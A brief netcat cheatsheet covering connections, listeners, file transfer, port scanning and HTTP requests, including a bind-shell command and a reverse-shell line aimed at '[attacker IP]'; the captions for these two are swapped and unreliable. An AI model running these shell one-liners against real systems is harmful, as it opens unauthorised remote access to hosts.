---
title: Netcat
tags:
  - netcat
  - nc
  - cheatsheet
description: Cheatsheet for netcat usage
---
## Basic Usage
- **Connect to a remote host on a specific port:**
  ```bash
  nc [hostname] [port]
  ```

- **Listen on a specific port for incoming connections:**
  ```bash
  nc -l -p [port]
  ```

- **Transfer a file over a network (Sender):**
  ```bash
  nc [destination IP] [port] < [file]
  ```

- **Transfer a file over a network (Receiver):**
  ```bash
  nc -l -p [port] > [file]
  ```

- **Scan open ports on a target:**
  ```bash
  nc -zv [hostname or IP] [start_port]-[end_port]
  ```

## Advanced Usage
- **Create a simple chat server (Server):**
  ```bash
  nc -l -p [port]
  ```

- **Create a simple chat client (Client):**
  ```bash
  nc [hostname] [port]
  ```

- **Serve a directory over HTTP:**
  ```bash
  while true; do nc -l -p [port] -q 1 < index.html; done
  ```

- **Connect to a remote shell:**
  ```bash
  nc -l -p [port] -e /bin/bash
  ```

- **Bind a shell to a port (reverse shell):**
  ```bash
  nc [attacker IP] [port] -e /bin/bash
  ```

- **Send an HTTP GET request:**
  ```bash
  echo -e "GET / HTTP/1.1\r\nHost: [hostname]\r\nConnection: close\r\n\r\n" | nc [hostname] [port]
  ```

## Common Options
- **`-l`**: Listen mode (used for inbound connections).
- **`-p`**: Local port (specify the port to listen on).
- **`-z`**: Zero-I/O mode (used for scanning).
- **`-v`**: Verbose mode (prints more information).
- **`-e`**: Executes a program after a connection is established.
- **`-n`**: Numeric-only IP addresses, no DNS.
- **`-w`**: Timeout for connects and final net reads.
